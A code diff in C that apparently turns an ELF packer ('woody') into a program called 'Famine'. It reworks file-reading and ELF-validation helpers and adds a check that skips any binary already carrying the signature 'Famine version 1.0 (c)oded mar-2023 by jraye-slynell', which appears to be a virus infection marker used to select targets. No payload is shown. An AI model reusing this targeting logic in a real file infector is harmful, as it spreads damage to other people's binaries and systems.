@@ -1,4 +1,4 @@
-#include "woody.h"
+#include "famine.h"
 
 ssize_t get_file_size(const char *file_name)
 {
@@ -6,32 +6,37 @@ ssize_t get_file_size(const char *file_name)
 
 	if (!(lstat(file_name, &stat) == 0))
 	{
-		elf_error(E_OPEN);
+		return ERROR_CODE;
 	}
 
 	return stat.st_size;
 }
 
-void copy_file(t_woody *woody, char *filename)
+int copy_file(t_woody *woody, char *filename)
 {
 	int fd = open(filename, O_RDONLY);
 
 	if (fd < 0)
 	{
-		elf_error(E_OPEN);
+		return ERROR_CODE;
 	}
 
 	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
 	{
 		close(fd);
-		free(woody->addr);
-		elf_error(E_COPY);
+		return ERROR_CODE;
 	}
-
+	char * string = woody->addr;
+	for (int i = 0; i < woody->filesize; i++){
+		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 53) != NULL){
+			return ERROR_CODE;
+		}
+	}
 	close(fd);
+	return 0;
 }
 
-void check_fileformat(unsigned char *c)
+int check_fileformat(unsigned char *c)
 {
 	if (c[0] == 0x7f &&
 		c[1] == 'E' &&
@@ -40,26 +45,36 @@ void check_fileformat(unsigned char *c)
 		c[4] == ELFCLASS64 &&
 		(c[16] == ET_EXEC || c[16] == ET_DYN))
 	{
-		return;
+		return 0;
 	}
 	else
 	{
-		elf_error(E_FILE_INVALID);
+		free(c);
+		return ERROR_CODE;
 	}
 }
 
-void read_elf_file(t_woody *woody, char *filename)
+int read_elf_file(t_woody *woody, char *filename)
 {
-
 	woody->filesize = get_file_size(filename);
+	if(woody->filesize == ERROR_CODE || woody->filesize < 16){
+		free(filename);
+		return ERROR_CODE;
+	}
 
+	woody->filename = filename;
 	woody->addr = malloc(woody->filesize);
 	if (woody->addr == NULL)
 	{
-		elf_error(E_MALLOC);
+		free(filename);
+		return ERROR_CODE;
 	}
 
-	copy_file(woody, filename);
-
-	check_fileformat(woody->addr);
+	if(copy_file(woody, filename) == ERROR_CODE){
+		free(filename);
+		free(woody->addr);
+		return ERROR_CODE;
+	}
+	free(filename);
+	return check_fileformat(woody->addr);
 }
